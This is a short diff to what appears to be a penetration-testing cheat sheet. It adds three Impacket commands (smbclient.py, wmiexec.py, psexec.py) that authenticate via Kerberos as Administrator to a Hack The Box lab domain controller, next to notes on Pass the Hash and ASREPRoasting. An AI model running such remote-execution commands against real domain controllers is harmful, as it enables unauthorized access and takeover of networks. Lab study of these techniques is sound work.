@@ -225,6 +225,10 @@ python3 -m pipx install impacket
     - Shell access via SMB shares (Pass the Hash) 
   - **GetNPUsers**
     - Kerberos Pre-authentication disabled (ASREPRoasting)
+
+smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
+wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
+psexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
 ```
 
 **[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**
